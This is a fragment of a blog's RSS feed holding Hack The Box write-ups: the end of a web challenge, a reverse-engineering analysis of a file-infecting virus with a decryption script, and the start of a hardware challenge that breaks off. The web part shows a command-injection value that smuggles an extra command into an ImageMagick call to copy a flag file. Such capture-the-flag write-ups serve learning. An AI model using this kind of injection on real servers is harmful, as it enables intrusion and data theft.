+At this point I realized that I probably don&amp;rsquo;t have to use the built in vulnerability in the &lt;code>Imagemagick&lt;/code> module, and could probably just use the command injection I have here to spawn a shell or use &lt;code>mv&lt;/code> to copy the flag to the output directory, but the &lt;code>convert&lt;/code> tool has a &lt;code>-write&lt;/code> option that just simplifies everything so that is the reason I ended up not using a more sophisticated command injection payload.
+Anyways, we will insert the following into the &lt;code>srcFormat&lt;/code> parameter:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The space after &lt;code>flag&lt;/code> and the &lt;code>; echo &lt;/code> are important in order to break up the original command and prevent any errors from breaking our injection.
+The final command thats runs server side would be:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; png:- -write uploads/flag &lt;span class="p">;&lt;/span> &lt;span class="nb">echo&lt;/span> AVIF:file_name
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2.PNG"
+width="649"
+height="587"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/2_hu65ccfe9683161db203d90f1b030012d5_77965_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Inserting our new parameter on the POST request"
+class="gallery-image"
+data-flex-grow="110"
+data-flex-basis="265px"
+>&lt;/p>
+&lt;p>Then we can download the flag, and use &lt;code>exiftool -b&lt;/code> to extract the flag from the image :).&lt;/p></description></item><item><title>HTB Iterative Virus</title><link>https://Kvn11.github.io/p/htb-iterative-virus/</link><pubDate>Tue, 12 Sep 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-iterative-virus/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/hackthebox.jpg" alt="Featured image of post HTB Iterative Virus" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: While cleaning up the workspace of a recently retired employee, we noticed that one of the core files of the very important programs they were working on didn&amp;rsquo;t match up with the backups we have of it, could you check it out for us?&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="initial-analysis">Initial Analysis
+&lt;/h2>&lt;p>Upon running the executable, nothing out of the ordinary seemed to happen.
+The &lt;code>.exe&lt;/code> printed &amp;ldquo;Hello World!&amp;rdquo; and exited normally.
+&lt;code>PEBear&lt;/code> showed that there was another strange section in the exe file called &lt;code>.ivir&lt;/code>.
+I made the assumption that this was a reference to &lt;code>I terative VIRus&lt;/code>, and the entry point being in this section further reinforced my theory that this was the &amp;ldquo;virus&amp;rdquo; part of the file.
+The time stamp was set to &lt;code>deadc0de&lt;/code> which was also strange, since that translates to a date well into the future.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1.png"
+width="1038"
+height="523"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="PE Bear analysis"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="476px"
+>&lt;/p>
+&lt;h2 id="reversing-with-ida-free">Reversing with IDA Free
+&lt;/h2>&lt;p>The first interesting function to look at is one that returns a function name based on a number it is given.
+It uses stack strings to prevent analysis tools from detecting the string as a string.
+We can right click on the hex values to convert them to characters.
+The result name is then passed to another function that seems to return a function pointer.
+This made me think that the exe was dynamically resolving functions.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2.PNG"
+width="484"
+height="705"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Dynamic Resolving Function 1"
+class="gallery-image"
+data-flex-grow="68"
+data-flex-basis="164px"
+>&lt;/p>
+&lt;p>After we sort through each function call and match up the result, we can see the functions that have been resolved:&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3.PNG"
+width="1426"
+height="340"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Dynamic Resolving Function 2"
+class="gallery-image"
+data-flex-grow="419"
+data-flex-basis="1006px"
+>&lt;/p>
+&lt;p>After these functions have been resolved, there is a value 5 bytes after the entry point that is compared.
+If the value is 5, then a function is called.
+However, this function seems to be broken, encrypted, or heavily obfuscated since the disassembly doesn&amp;rsquo;t seem valid.
+Otherwise, what seems like a key value is chosen and saved.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4.PNG"
+width="671"
+height="488"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Key Values"
+class="gallery-image"
+data-flex-grow="137"
+data-flex-basis="330px"
+>&lt;/p>
+&lt;p>Then the exe will iterate over all the &lt;code>*.exe&lt;/code> files in its current directory, confirm some checks, and if everything looks good it will perform some actions on the current &lt;code>.exe&lt;/code> file.
+The main check is that the timestamp of the file needs to be set to &lt;code>THIS&lt;/code> otherwise the infection of the file will not take place.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5.PNG"
+width="733"
+height="279"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Infection Checks"
+class="gallery-image"
+data-flex-grow="262"
+data-flex-basis="630px"
+>&lt;/p>
+&lt;p>Most the proceeding infection process isn&amp;rsquo;t super important, and was in fact pretty tedious to look through and rename.
+A new section and section header are added and modified to make sure they adhere to alignment rules, and the rest of the process is just copying over the infection code and making it so it replaces the entry point of the victim file.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6.PNG"
+width="927"
+height="537"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Infection Process"
+class="gallery-image"
+data-flex-grow="172"
+data-flex-basis="414px"
+>&lt;/p>
+&lt;p>The end of the process loops over the data from the broken function from earlier, and multiplies it against the key value selected earlier.
+This new modified code is then copied into the victim file.
+Then the byte 5 bytes ahead of the entry point is incremented and copied into the victim file.
+This means when the newly infected victim exe is run, it will use the second key.
+Then the next file to be infected will use the third key, and so on until the 4th iteration when that special byte is set to 5.
+At that point the strange function from earlier runs.
+This implies that after a certain number of infections the strange function reveals itself.
+I verified most of this with dynamic analysis as well, but didn&amp;rsquo;t take any screenshots.
+If you want to verify with a debugger, set a breakpoint after the &lt;code>MapViewOfFile&lt;/code> function and follow it in dump.
+From there you can follow along with the exe code as it checks and modifies different parts of the victim file.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7.PNG"
+width="870"
+height="136"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Decryption Process"
+class="gallery-image"
+data-flex-grow="639"
+data-flex-basis="1535px"
+>&lt;/p>
+&lt;p>I ran the exe in &lt;code>x64Dbg&lt;/code>, and copied out the encrypted code so I could manually decrypt it.
+You could just manipulate the registers to do it all within &lt;code>x64Dbg&lt;/code> but I ran into exceptions doing that so I opted for the python approach.
+Here is the script that decrypts the flag function:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0xE25C0FE4937ECD98&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x46943D7D6211854C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7ED9FD7403244F3B&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0954450DD34BC4FB&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x34738E7E3DC62246&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x382DF5BC3CDDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x138529F69C81C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xE9FCF6D4DD85105E&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x5B977D744A5DBD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xC2D93D4B963E5C85&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB3DD747A06D5A985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xD454843DE2F28EBF&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0215CEB076580EDC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3F55D6792852AA4D&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x17AF0A0E48DDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x547EA605BB8640AD&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x243D8A75B199B575&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x27D1C0EDAE5CB998&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6108284AE5787878&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7E49F4DF10792485&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xACD9F651E2F28EBF&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xADA04BA5BA8A1444&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xF77252CAFD2A38C9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x388BB9FB9D000000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x8CC468D4A37B0000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x891DB54E4E4ABD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xEFCE883F2C030000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x399F79C914778100&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xB5B1F45FAD045A5C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB721A6D9B394FF4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB0DE9DB43DD7A1B3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xCC3AF2334A813038&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x3DD6D4E506470273&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x339B093AB6A0F837&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3E997481AE05CCA5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x689018943160B8AC&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xE35AE4EDCF035760&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6D46B194A1A37B36&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3619E5691F021894&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0AFD79C343528DEC&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0F7FEA94A59656C0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8DAE5CB998000000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1770879F9859C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x28B283C42B81C398&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x7B7B67D3051D07B1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xBFE4C34F82F76B75&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1B6CED770BFBA985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB8E5061F67130000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x953D7B885F773041&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1C206CC310CA422A&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x87130CC425BC4A04&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x6E2368B9C685770B&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xEB7FD64E061C1A3D&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xCB8FF2D53D7505A1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xF1EF554206DCE4D&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">result&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hex_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hex_string&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_3&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Attempting to analyze this decrypted code didn&amp;rsquo;t yield any results, so I figured it required the context of the full program to work successfully.
+At this point I used &lt;code>HxD&lt;/code> to patch the virus exe to overwrite the encrypted code with the decrypted one.
+Then I opened it in IDA and saw that the decrypted code was also resolving more functions dynamically, although these function&amp;rsquo;s aren&amp;rsquo;t too important as the flag is visible in plaintext at this point.
+The functions would open up a message box containing the flag value I think.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8.PNG"
+width="908"
+height="508"
+srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="428px"
+>&lt;/p>
+&lt;h2 id="lessons-learned">Lessons Learned
+&lt;/h2>&lt;p>I spent much more time on this challenge than I should have.
+A lot of time was wasted on reversing the exact infection process and seeing what fields were being changed in the headers of the victim file.
+I should have focused on the decryption portion and the code surrounding that instead.
+All in all, I think for next time I should focus less on the details and more so on the &amp;ldquo;bigger picture&amp;rdquo; of what the application is doing.&lt;/p></description></item><item><title>HTB HW Challenge Trace</title><link>https://Kvn11.github.io/p/htb-hw-challenge-trace/</link><pubDate>Wed, 10 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-trace/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge Trace" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: One of our embedded devices has been compromised.
+It was flashing a message on the debug matrix that was too fast to read, although we managed to capture one iteration of it.
+We must find out what was displayed.
+To help you with your mission, we will also provide you with the fabrication files of the PCB module the matrix was on.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="walkthrough">Walkthrough
+&lt;/h2>&lt;p>The zip files contains a Gerber module, as well as a &lt;code>.csv&lt;/code> containing what seems to be the outputs of different &lt;code>GPIO&lt;/code> pins, as well as the time they were recorded.&lt;/p>
+&lt;p>Having never really worked with a Gerber module before I had to do research to figure out its importance and usage.&lt;/p>
+&lt;p>Gerber describes the elements of a printed circuit board (PCB).
+It is used for both the fabrication of the board, and its assembly.
+A quick google search tells me that I can open the files using &lt;code>gerbv&lt;/code>.
+For some reason, the window would go black whenever I tried importing the &lt;code>.DRL&lt;/code> files, so I excluded those. However, this is the final result:&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1.png"
+width="1441"
+height="740"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Gerber File"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="467px"
+>&lt;/p>
+&lt;p>There is a term &lt;code>Common Anode Matrix&lt;/code> that I have never heard of before, as well as the MCU on the board being a &lt;code>Raspberry Pi 3b+ Hat&lt;/code>.
+ChatGPT reveals that a common anode matrix is simply a grid of LED&amp;rsquo;s, and specific LED&amp;rsquo;s are supplied voltage to create images, letters, or numbers.
+Based on this, I can assume that the flag is flashing on the matrix, and I need to map the outputs of the &lt;code>.csv&lt;/code> file to its LED on the board.
+I was able to find the following image online which nicely displays the pinout of the Raspberry Pi:&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2.png"
+width="793"
+height="599"
+srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Pinout"
+class="gallery-image"
+data-flex-grow="132"
+data-flex-basis="317px"
